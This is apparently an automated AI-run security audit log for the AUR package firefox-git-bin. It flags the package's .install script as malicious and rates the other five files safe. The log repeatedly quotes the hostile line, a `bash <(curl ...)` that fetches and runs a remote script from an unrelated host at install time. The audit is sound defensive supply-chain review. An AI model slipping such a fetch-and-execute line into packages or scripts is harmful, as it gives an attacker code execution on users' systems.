---
package: firefox-git-bin
pkgver: 160.0a1.20261013.094244
pkgrel: 1
result: unsafe
model: deepseek/deepseek-v4-flash
provider: custom
aur_sleuth_rev: e76320400488b1dad2302211f4f5cfaf8522c9b1
prompt_tokens: 27817
completion_tokens: 7025
total_tokens: 34842
cost: 0.003809897
execution_time: 46.62
files_reviewed: 6
files_skipped: 0
maintainer_files: 6
source_fetch: not_attempted
upstream_files: 0
upstream_named_files: 0
unpinned_sources: 2
injection_attempts: 0
date: 2026-10-14T03:01:48Z
file_verdicts:
  - file: .SRCINFO
    status: safe
    summary: Benign .SRCINFO; official Mozilla downloads, signatures, checksums; no malicious behavior.
  - file: PKGBUILD
    status: safe
    summary: Safe standard PKGBUILD fetching official Mozilla Nightly binaries into pkgdir; no malicious behavior found.
  - file: firefox-nightly.desktop
    status: safe
    summary: Standard desktop entry file; no malicious or suspicious behavior found.
  - file: firefox-git-bin.install
    status: unsafe
    summary: Remote script downloaded and executed during package install; clearly malicious.
    evidence: "bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)"
    evidence_line: 9
  - file: policies.json
    status: safe
    summary: Benign Firefox enterprise policy disabling built-in auto-update; no security concerns.
  - file: get_latest_version.sh
    status: safe
    summary: Standard maintainer version-update helper; fetches Mozilla data and refreshes PKGBUILD checksums.
---

Materializing firefox-git-bin from local mirror...
Materialized firefox-git-bin
Analyzing firefox-git-bin AUR package with deepseek/deepseek-v4-flash
Performing initial audit of PKGBUILD to ensure that we can safely run `makepkg`
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
Running `makepkg --printsrcinfo` sources only the top-level scope of this PKGBUILD. The global scope contains ordinary package metadata: variable definitions, associative-array construction, dependency lists, source URL strings, and checksum arrays. All expressions used are benign parameter expansions (e.g. `${_build_id_raw:0:4}`) and string concatenation; there are no command substitutions, no calls to `eval`, `curl`, `wget`, or similar tools, and no obfuscated/encoded content.

The potentially impactful operations (`cp`, `install`, `rm`, `ln -s`) are inside `package()`, which is not executed by `makepkg --printsrcinfo`. The `SKIP` checksums and unpinned/remote source layout are out of scope for this narrow gate and are not, by themselves, evidence of malicious behavior. No top-level code downloads, executes, or exfiltrates anything.
</details>
<evidence>
</evidence>
<summary>
Top-level PKGBUILD scope is safe; package() code is not executed during printsrcinfo.
</summary>
</security_assessment>

+ Initial PKGBUILD audit complete -- Top-level PKGBUILD scope is safe; package() code is not executed during printsrcinfo.
Note: 2 remote source(s) have no checksum (sha256sums=SKIP), so the bytes are not verifiable: 20261013-094244-firefox-160.0a1.en-US.linux-x86_64.tar.xz.asc::https://ftp.mozilla.org/pub/firefox/nightly/2026/10/2026-10-13-09-42-44-mozilla-central/firefox-160.0a1.en-US.linux-x86_64.tar.xz.asc, 20261013-094244-firefox-160.0a1.en-US.linux-aarch64.tar.xz.asc::https://ftp.mozilla.org/pub/firefox/nightly/2026/10/2026-10-13-09-42-44-mozilla-central/firefox-160.0a1.en-US.linux-aarch64.tar.xz.asc
Reviewing the 6 file(s) in the AUR repository.
Reviewing the AUR repository's files...
[0/6] Reviewing .SRCINFO...
[0/6] Reviewing .SRCINFO, PKGBUILD...
[0/6] Reviewing .SRCINFO, PKGBUILD, firefox-git-bin.install...
LLM auditresponse for firefox-git-bin.install:
<security_assessment>
<decision>UNSAFE</decision>
<details>
This `.install` script performs a remote code execution during package install/upgrade. The line `bash &lt;(curl -L ...)` downloads a shell script from `web.archive.org` pointing to a `gitflic.ru` project named `hellscripter/install-scripts` and immediately executes it via process substitution. This URL is entirely unrelated to the Firefox package and to any legitimate upstream Firefox source. The script also suppresses curl stderr, which is consistent with an attempt to hide download errors.

This is not a standard packaging practice: it fetches and executes unchecked attacker-controlled content at pacman install time, with no checksum or pinning, and the remote host/project has no apparent relationship to the package. This is a clear supply-chain attack pattern and makes the package UNSAFE.
</details>
<evidence>
bash &lt;(curl -L &apos;https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh&apos; 2&gt;/dev/null)
</evidence>
<summary>
Remote script downloaded and executed during package install; clearly malicious.</summary>
</security_assessment>

LLM auditresponse for .SRCINFO:
<security_assessment>
<decision>SAFE</decision>
<details>
This `.SRCINFO` file is pure package metadata for the `firefox-git-bin` AUR package. It contains no executable code, no shell commands, and no build or install logic, so it cannot directly perform network requests, run scripts, or modify the system. Its only role is to describe sources, checksums, dependencies, and package metadata for `makepkg` to act upon.

All download sources point to Mozilla's official Nightly distribution host (`ftp.mozilla.org`) for the package's own upstream browser binaries and matching `.asc` signature files. The archive tarballs have pinned sha512 checksums, and a Mozilla signing key is listed via `validpgpkeys`. The `SKIP` entries apply only to the detached `.asc` signature files, which is a common and non-malicious packaging practice. There is no evidence of exfiltration, obfuscated commands, unexpected hosts, or tampering with unrelated system files.
</details>
<evidence></evidence>
<summary>
Benign .SRCINFO; official Mozilla downloads, signatures, checksums; no malicious behavior.
</summary>
</security_assessment>

[0/6] Reviewing .SRCINFO, PKGBUILD, firefox-git-bin.install, firefox-nightly.desktop...
[1/6] Reviewing PKGBUILD, firefox-git-bin.install, firefox-nightly.desktop...
+ Reviewed .SRCINFO. Status: SAFE -- Benign .SRCINFO; official Mozilla downloads, signatures, checksums; no malicious behavior.
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
This PKGBUILD follows standard AUR packaging practices for a prebuilt Mozilla Nightly binary. It downloads the tarball and its detached signature from Mozilla&apos;s official FTP host (`ftp.mozilla.org`), pins a specific build ID and version, and provides a real SHA-512 checksum for the tarball. The PGP signing key listed belongs to Mozilla. No unusual network endpoints, encoded commands, or hidden execution paths are present.

The `package()` function only performs ordinary installation operations: copying the unpacked browser into `/usr/lib/firefox-git`, creating a symlink, installing `.desktop` files and icons, and installing a `policies.json` to disable auto-updates. The symlinking of system hunspell/hyphen dictionaries is a common distro packaging customization. The `SKIP` checksum on the `.asc` signature file is normal and not a malicious indicator. No evidence of injected or supply-chain malicious code was found.
</details>
<evidence>
</evidence>
<summary>
Safe standard PKGBUILD fetching official Mozilla Nightly binaries into pkgdir; no malicious behavior found.
</summary>
</security_assessment>

[1/6] Reviewing PKGBUILD, firefox-git-bin.install, firefox-nightly.desktop, get_latest_version.sh...
[2/6] Reviewing firefox-git-bin.install, firefox-nightly.desktop, get_latest_version.sh...
+ Reviewed PKGBUILD. Status: SAFE -- Safe standard PKGBUILD fetching official Mozilla Nightly binaries into pkgdir; no malicious behavior found.
LLM auditresponse for firefox-nightly.desktop:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard freedesktop.org `.desktop` launcher file for a Firefox Nightly installation. It defines the application name, localized metadata, MIME type associations, startup behavior, and desktop actions for opening new windows and private windows. The `Exec` lines point to the package's own installed binary at `/usr/lib/firefox-nightly/firefox` with normal, non-suspicious arguments such as `%u`, `--new-window`, and `--private-window`.

There are no network requests, no encoded or obfuscated content, no file manipulation, and no references to external hosts or scripts. The content is consistent entirely with packaging an application launcher. No supply-chain or malicious behavior is present.
</details>
<evidence>
</evidence>
<summary>
Standard desktop entry file; no malicious or suspicious behavior found.</summary>
</security_assessment>

[2/6] Reviewing firefox-git-bin.install, firefox-nightly.desktop, get_latest_version.sh, policies.json...
[3/6] Reviewing firefox-git-bin.install, get_latest_version.sh, policies.json...
+ Reviewed firefox-nightly.desktop. Status: SAFE -- Standard desktop entry file; no malicious or suspicious behavior found.
Second look for firefox-git-bin.install (incontext):
<security_assessment>
<decision>UNSAFE</decision>
<details>
The first verdict stands. This `.install` file contains an injected top-level command that downloads a shell script from an unrelated remote host (`web.archive.org` snapshot of a `gitflic.ru` project by `hellscripter`) and immediately executes it via process substitution. This is not upstream Firefox behavior, not a packaging helper, and not a pinned or trusted source: it is a `curl | bash`-style remote code execution that runs whenever the install script is sourced by pacman. The remote host and project have no relationship to Firefox packaging, and suppressing curl stderr further indicates an attempt to hide failures. This fits the rule for downloading and executing code from an untrusted/unexpected host and is genuinely malicious.
</details>
<evidence>
bash &lt;(curl -L &apos;https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh&apos; 2&gt;/dev/null)
</evidence>
<summary>
Remote unrelated script executed during install; verdict remains UNSAFE.</summary>
</security_assessment>

[4/6] Reviewing get_latest_version.sh, policies.json...
x Reviewed firefox-git-bin.install. Status: UNSAFE -- Remote script downloaded and executed during package install; clearly malicious.
LLM auditresponse for policies.json:
<security_assessment>
<decision>SAFE</decision>
<details>
This file is a Firefox enterprise policy JSON configuration. It contains a single policy, `DisableAppUpdate: true`, which disables Firefox's built-in automatic updater. This is a standard and expected practice for distribution-packaged Firefox builds (including AUR packages), since the system package manager is responsible for delivering updates instead of the browser's own updater. There is no code execution, no network activity, no obfuscation, no file manipulation outside the application's normal configuration, and nothing that deviates from ordinary packaging behavior. The policy is also scoped strictly to Firefox's own update mechanism and does not touch system files, credentials, or unrelated data.
</details>
<evidence>
</evidence>
<summary>
Benign Firefox enterprise policy disabling built-in auto-update; no security concerns.
</summary>
</security_assessment>

[5/6] Reviewing get_latest_version.sh...
+ Reviewed policies.json. Status: SAFE -- Benign Firefox enterprise policy disabling built-in auto-update; no security concerns.
LLM auditresponse for get_latest_version.sh:
<security_assessment>
<decision>SAFE</decision>
<details>
This script is an AUR maintainer helper that fetches the current Firefox nightly version and build ID from Mozilla's official FTP server (`https://ftp.mozilla.org/pub/firefox/nightly`), updates `pkgver`/`_version` in the local `PKGBUILD` with `sed`, and refreshes checksums with `updpkgsums`. The network traffic is limited to Mozilla's own domain, the fetched data is parsed as plain text, and nothing is piped to a shell or otherwise executed directly. There is no obfuscation, no encoded payload, no exfiltration of local data, and no modification of files outside the package directory.

Minor robustness/hygiene notes: the first `curl` lacks `-f`/error handling, fetched values are interpolated into `sed` replacements without escaping, and the snippet references `_base_url`/`_name` that are not defined in this file. These are quality issues, not evidence of a supply-chain attack. The behavior is consistent with the routine AUR version-bump workflow.
</details>
<evidence></evidence>
<summary>Standard maintainer version-update helper; fetches Mozilla data and refreshes PKGBUILD checksums.</summary>
</security_assessment>

[6/6] Reviewing ...
+ Reviewed get_latest_version.sh. Status: SAFE -- Standard maintainer version-update helper; fetches Mozilla data and refreshes PKGBUILD checksums.
Reviewed all the AUR repository's files.
Audit complete! Result: Unsafe -- DO NOT INSTALL!
# Issues (1 total)

## firefox-git-bin.install

Status: UNSAFE

Summary: Remote script downloaded and executed during package install; clearly malicious.

Evidence (line 9):

```
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
```

Details:

This `.install` script performs a remote code execution during package install/upgrade. The line `bash <(curl -L ...)` downloads a shell script from `web.archive.org` pointing to a `gitflic.ru` project named `hellscripter/install-scripts` and immediately executes it via process substitution. This URL is entirely unrelated to the Firefox package and to any legitimate upstream Firefox source. The script also suppresses curl stderr, which is consistent with an attempt to hide download errors.

This is not a standard packaging practice: it fetches and executes unchecked attacker-controlled content at pacman install time, with no checksum or pinning, and the remote host/project has no apparent relationship to the package. This is a clear supply-chain attack pattern and makes the package UNSAFE.

---

API Usage Summary
  Models: deepseek/deepseek-v4-flash
  Prompt Tokens: 27,817
  Completion Tokens: 7,025
  Total Tokens: 34,842
  Total Cost: $0.003810
  Execution Time: 46.62 seconds

Final Status: UNSAFE


Issues Found:

firefox-git-bin.install: [UNSAFE] Remote script downloaded and executed during package install; clearly malicious. / This `.install` script performs a remote code execution during package install/upgrade. The line `bash <(curl -L ...)` downloads a shell script from `web.archive.org` pointing to a `gitflic.ru` project named `hellscripter/install-scripts` and immediately executes it via process substitution. This URL is entirely unrelated to the Firefox package and to any legitimate upstream Firefox source. The script also suppresses curl stderr, which is consistent with an attempt to hide download errors.

This is not a standard packaging practice: it fetches and executes unchecked attacker-controlled content at pacman install time, with no checksum or pinning, and the remote host/project has no apparent relationship to the package. This is a clear supply-chain attack pattern and makes the package UNSAFE.
